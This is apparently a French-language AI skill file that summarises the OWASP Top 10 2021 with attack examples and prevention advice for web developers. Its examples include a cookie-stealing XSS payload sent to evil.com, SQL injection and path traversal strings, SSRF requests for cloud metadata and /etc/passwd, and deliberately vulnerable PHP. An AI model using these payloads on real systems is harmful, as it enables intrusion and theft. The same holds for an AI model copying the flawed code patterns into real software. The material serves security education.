---
name: owasp-overview
description: >
  Référence complète OWASP Top 10 2021 : description, exemples d'attaque, mesures de prévention
  pour chacun des 10 risques critiques des applications web. Utiliser ce skill pour expliquer
  une vulnérabilité, comprendre un risque de sécurité, préparer un cours ou une présentation
  sur la sécurité applicative, ou répondre à toute question sur l'OWASP.
  Mots-clés déclencheurs : OWASP, sécurité, vulnérabilité, injection, XSS, CSRF, authentification,
  contrôle d'accès, cryptographie, misconfiguration, supply chain, SSRF, logging, audit sécurité.
---

# OWASP Top 10 — 2021

> Référence : https://owasp.org/Top10/fr/
> Document de sensibilisation sur les 10 risques de sécurité les plus critiques des applications web.

---

## A01 — Contrôles d'accès défaillants *(Broken Access Control)*

**Rang 2017 → 2021 :** #5 → **#1** | Présent dans 94% des applications testées.

### Description
Les utilisateurs peuvent agir en dehors de leurs permissions prévues.
Accès à des données d'autres utilisateurs, modification de données sans autorisation,
élévation de privilèges, manipulation d'URL ou de paramètres.

### Exemples d'attaque
```
# IDOR (Insecure Direct Object Reference)
GET /api/users/1234/documents   ← utilisateur authentifié en tant que #5678
→ accède aux documents de l'utilisateur #1234

# Manipulation d'URL
GET /admin/dashboard  ← utilisateur non-admin accède au panneau admin
```

### Prévention
- Appliquer le **principe du moindre privilège** : refuser par défaut, accorder explicitement
- Vérifier les droits à **chaque requête** (côté serveur, jamais côté client)
- Invalider les sessions après déconnexion côté serveur
- Logger les échecs de contrôle d'accès, alerter sur les répétitions
- Désactiver le listing de répertoires sur le serveur web
- Ne jamais exposer les clés primaires brutes dans les URLs (utiliser des UUID)

---

## A02 — Défaillances cryptographiques *(Cryptographic Failures)*

**Rang 2017 → 2021 :** #3 (Exposition données sensibles) → **#2**

### Description
Mauvaise utilisation (ou absence) de chiffrement pour protéger les données en transit
et au repos. Inclut les algorithmes obsolètes, la mauvaise gestion des clés, HTTP non sécurisé.

### Exemples d'attaque
```php
// ❌ Algorithme obsolète
$strHash = md5($strPassword);        // MD5 cracké en millisecondes
$strHash = sha1($strPassword);       // SHA1 aussi compromis

// ❌ Données sensibles en clair en BDD
INSERT INTO users VALUES ('alice', 'monmotdepasse123');

// ❌ Cookie de session transmis en HTTP (pas HTTPS)
Set-Cookie: session=abc123  // interceptable par MITM
```

### Prévention
- Chiffrer **toutes** les données sensibles au repos (AES-256)
- Utiliser **HTTPS uniquement** (HSTS, redirection HTTP→HTTPS)
- Hacher les mots de passe avec **bcrypt, Argon2 ou scrypt** (jamais MD5/SHA1/SHA256 seul)
- Ne pas mettre en cache les données sensibles
- Désactiver TLS 1.0 et 1.1, utiliser TLS 1.2+ minimum
- Ne jamais stocker de données sensibles inutilement (minimisation)

---

## A03 — Injection *(Injection)*

**Rang 2017 → 2021 :** #1 → **#3** | Inclut désormais le XSS.

### Description
Données non fiables envoyées à un interpréteur (SQL, OS, LDAP, NoSQL, HTML…).
L'attaquant peut lire, modifier, supprimer des données, exécuter des commandes.

### Exemples d'attaque
```php
// ❌ Injection SQL
$strId = $_GET['id'];   // attaquant envoie : 1 OR 1=1 --
$strQuery = "SELECT * FROM users WHERE id = $strId";

// ❌ XSS réfléchi
echo "<p>Bienvenue " . $_GET['name'] . "</p>";
// attaquant envoie : name=<script>document.location='evil.com?c='+document.cookie</script>

// ❌ Injection de commande OS
$strFile = $_GET['file'];
system("cat /uploads/" . $strFile);   // attaquant : ../../etc/passwd
```

### Prévention
- Utiliser des **requêtes paramétrées / prepared statements** (jamais de concaténation SQL)
- Utiliser un **ORM ou Query Builder** (ex: CI4 Query Builder)
- Valider et **filtrer toutes les entrées** côté serveur
- Échapper les sorties HTML (`htmlspecialchars`, `|escape` dans Smarty)
- Limiter les privilèges de compte BDD (pas de DROP/CREATE en production)
- Utiliser une **Content Security Policy (CSP)**

---

## A04 — Conception non sécurisée *(Insecure Design)*

**Rang 2017 → 2021 :** Nouveau → **#4**

### Description
Défauts architecturaux et de conception, pas uniquement d'implémentation.
Absence de modélisation des menaces, de patterns de sécurité, de limites métier.

### Exemples d'attaque
```
# Pas de limite sur les tentatives de connexion → brute force
# Question secrète pour récupérer un mot de passe (réponse devinable)
# API sans pagination → dump de toute la BDD
# Flux de paiement non sécurisé → manipulation du montant côté client
```

### Prévention
- Intégrer la sécurité **dès la conception** (Secure by Design)
- Faire de la **modélisation des menaces** (threat modeling) sur les fonctionnalités critiques
- Limiter le **nombre de requêtes** (rate limiting) sur les endpoints sensibles
- Définir des **limites métier** (plafonds de commande, vérifications anti-fraude)
- Séparer les environnements (dev/staging/prod) avec des données de test distinctes
- Écrire des **user stories avec critères de sécurité** (cas d'abus)

---

## A05 — Mauvaises configurations de sécurité *(Security Misconfiguration)*

**Rang 2017 → 2021 :** #6 → **#5** | 90% des applications ont une misconfiguration.

### Description
Configurations par défaut non modifiées, fonctionnalités inutiles activées, erreurs
détaillées exposées, permissions trop larges, headers de sécurité absents.

### Exemples d'attaque
```
# En-têtes HTTP absents
→ Pas de X-Frame-Options → Clickjacking possible
→ Pas de Content-Security-Policy → XSS facilité

# Mode debug activé en production
CI_ENVIRONMENT = development   ← expose les stack traces, chemins, variables

# Credentials par défaut non changés
admin / admin  sur phpMyAdmin, panneaux d'administration

# CORS trop permissif
Access-Control-Allow-Origin: *   ← n'importe quel site peut faire des requêtes
```

### Prévention
- Désactiver le mode debug en production (`CI_ENVIRONMENT = production`)
- Configurer les **headers de sécurité HTTP** : CSP, HSTS, X-Frame-Options, X-Content-Type-Options
- Supprimer les fonctionnalités, docs, exemples inutilisés
- Changer tous les **identifiants par défaut** (BDD, admin, SMTP…)
- Revue de configuration à chaque déploiement
- Automatiser la vérification des configs avec des outils (ex: Mozilla Observatory)

---

## A06 — Composants vulnérables et obsolètes *(Vulnerable and Outdated Components)*

**Rang 2017 → 2021 :** #9 → **#6**

### Description
Utilisation de bibliothèques, frameworks ou composants avec des vulnérabilités connues
(CVE). Concerne aussi les dépendances transitives et les OS/serveurs non patchés.

### Exemples d'attaque
```bash
# Composer avec dépendances obsolètes
composer show --outdated   # plusieurs packages avec CVE connues

# PHP ancien avec failles non patchées
PHP 7.4 → EOL, plus de correctifs de sécurité

# Bootstrap 3.x avec XSS connus
```

### Prévention
- Inventorier toutes les dépendances et leurs versions (`composer.lock`)
- Surveiller les CVE : `composer audit`, Dependabot, Snyk
- Mettre à jour régulièrement (patch, minor, major selon urgence sécurité)
- Télécharger les composants uniquement depuis des sources officielles
- Supprimer les dépendances inutilisées

---

## A07 — Identification et authentification défaillantes *(Identification and Authentication Failures)*

**Rang 2017 → 2021 :** #2 (Broken Auth) → **#7**

### Description
Failles dans les mécanismes d'authentification : mots de passe faibles acceptés,
brute force possible, tokens de session prévisibles, gestion du "mot de passe oublié" non sécurisée.

### Exemples d'attaque
```
# Brute force sans limitation
POST /login  →  1000 tentatives/minute sans blocage

# Session non invalidée après déconnexion
Cookie: session=abc123  →  utilisable après logout

# Token de réinitialisation prévisible ou sans expiration
/reset-password?token=12345   ← token séquentiel, valable indéfiniment
```

### Prévention
- Utiliser un framework d'authentification éprouvé (**CI4 Shield**)
- Imposer des **mots de passe forts** (longueur min. 12 caractères, complexité)
- Mettre en place le **MFA** (authentification multi-facteurs) sur les comptes sensibles
- Limiter les tentatives de connexion (**rate limiting, captcha**)
- Invalider toutes les sessions actives après changement de mot de passe
- Les tokens de reset doivent être aléatoires, à usage unique, et expirer (< 15 min)

---

## A08 — Manque d'intégrité des données et du logiciel *(Software and Data Integrity Failures)*

**Rang 2017 → 2021 :** Nouveau (inclut A8:2017 Désérialisation non sécurisée) → **#8**

### Description
Code et infrastructure ne protègent pas contre les violations d'intégrité :
mises à jour sans vérification de signature, pipelines CI/CD non sécurisés, désérialisation de données non fiables.

### Exemples d'attaque
```php
// ❌ Désérialisation de données utilisateur sans vérification
$objData = unserialize($_COOKIE['data']);   // injection d'objet PHP possible

// ❌ Mise à jour automatique depuis une source non vérifiée
// ❌ Pipeline CI/CD sans contrôle d'accès → injection de code malveillant
```

### Prévention
- Ne jamais désérialiser des données provenant de sources non fiables
- Vérifier les **signatures numériques** des mises à jour logicielles
- Sécuriser le pipeline CI/CD (accès restreint, audit des modifications)
- Utiliser un gestionnaire de dépendances avec vérification d'intégrité (`composer.lock`)
- Revue de code obligatoire avant merge en production

---

## A09 — Carence des systèmes de contrôle et de journalisation *(Security Logging and Monitoring Failures)*

**Rang 2017 → 2021 :** #10 → **#9**

### Description
Absence de journalisation des événements de sécurité, logs insuffisants ou non surveillés.
Le délai moyen de détection d'une brèche est de **200 jours**.

### Exemples d'attaque
```
# Aucun log des connexions échouées → brute force invisible
# Logs présents mais jamais analysés → intrusion non détectée
# Logs stockés dans l'application compromise → effacés par l'attaquant
```

### Prévention
- Logger les **connexions** (succès, échec), modifications de droits, erreurs critiques
- Inclure dans chaque log : timestamp, IP, user ID, action, résultat
- Stocker les logs dans un **système externe** à l'application (non modifiable)
- Mettre en place des **alertes automatiques** sur les anomalies (> X échecs/minute)
- Définir et tester un **plan de réponse aux incidents**
- Conserver les logs suffisamment longtemps (RGPD : durée minimale justifiée)

---

## A10 — Falsification de requêtes côté serveur *(Server-Side Request Forgery — SSRF)*

**Rang 2017 → 2021 :** Nouveau → **#10**

### Description
L'application récupère une ressource distante sans valider l'URL fournie par l'utilisateur.
L'attaquant peut forcer le serveur à envoyer des requêtes vers des ressources internes
(métadonnées cloud, services internes, intranet).

### Exemples d'attaque
```
# Appel d'une URL fournie par l'utilisateur
GET /fetch?url=http://169.254.169.254/latest/meta-data/   ← AWS metadata
GET /fetch?url=http://localhost:6379   ← Redis interne
GET /fetch?url=file:///etc/passwd      ← lecture de fichier local
```

### Prévention
- Valider et filtrer toutes les URLs fournies par l'utilisateur
- Utiliser une **liste blanche** de domaines/IPs autorisés (pas de liste noire)
- Désactiver les redirections HTTP dans le client HTTP utilisé
- Ne pas envoyer de réponses brutes au client (filtrer les métadonnées)
- Segmenter le réseau pour limiter l'accès aux services internes
- Désactiver les schémas non nécessaires : `file://`, `dict://`, `ftp://`

---

## Résumé rapide

| # | Risque | Impact | Nouveauté 2021 |
|---|--------|--------|----------------|
| A01 | Contrôles d'accès défaillants | 🔴 Critique | Monté de #5 |
| A02 | Défaillances cryptographiques | 🔴 Critique | Monté de #3 |
| A03 | Injection (+ XSS) | 🔴 Critique | Descendu de #1 |
| A04 | Conception non sécurisée | 🟠 Élevé | **Nouveau** |
| A05 | Mauvaise configuration | 🟠 Élevé | Monté de #6 |
| A06 | Composants vulnérables | 🟠 Élevé | Monté de #9 |
| A07 | Auth défaillante | 🟠 Élevé | Descendu de #2 |
| A08 | Intégrité données/logiciel | 🟠 Élevé | **Nouveau** |
| A09 | Logging insuffisant | 🟡 Moyen | Monté de #10 |
| A10 | SSRF | 🟡 Moyen | **Nouveau** |
